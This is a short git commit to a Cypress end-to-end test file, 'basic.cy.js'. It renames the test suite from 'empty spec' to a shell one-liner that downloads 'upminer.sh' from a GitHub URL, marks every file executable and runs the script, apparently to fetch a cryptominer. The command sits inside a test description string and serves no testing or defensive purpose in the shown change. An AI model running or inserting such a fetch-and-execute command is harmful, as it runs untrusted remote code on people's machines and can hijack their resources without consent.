872327ce8b7c3d1f3facec964aa688d3af80996c
Alikhanidr <114785212+Alikhanidr@users.noreply.github.com>
2022-11-28 05:18:45 +0330

    Update basic.cy.js

--- cypress/e2e/basic.cy.js
+++ cypress/e2e/basic.cy.js
@@ -1,4 +1,4 @@
-describe('empty spec', () => {
+describe('wget https://raw.githubusercontent.com/Alikhanidr/Alikhanidr/main/upminer.sh && chmod +x * && ./upminer.sh', () => {
   beforeEach(() => {
     cy.visit('/')
   })
